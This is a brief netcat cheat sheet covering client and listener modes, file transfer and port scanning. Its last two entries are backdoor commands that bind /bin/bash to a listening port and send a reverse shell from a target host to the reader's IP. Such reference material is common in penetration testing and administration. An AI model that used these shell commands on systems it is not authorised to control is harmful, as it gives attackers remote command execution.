---
tags:
  - linux
  - packages
  - networking
---
Connect to arbitrary port at IP, Netcat client mode
```shell
nc $target $remotePort
```

Listen on arbitrary local port, Netcat listener mode
```shell
nc -l -p $localPort
```

Push file from client to listener
```shell
nc -l -p $localPort > $outFile
```

Pull a file from listener to client
```shell
nc -l -p $localPort < $inFile
```

Port scan
```shell
nc -v -n -z -w1 $target ${startPort}-${endPort}
```

Listening backdoor shell
```shell
nc -l -p $localPort -e /bin/bash
```

Reverse backdoor shell to your IP from target host
```shell
nc $yourIP $port -e /bin/bash
```



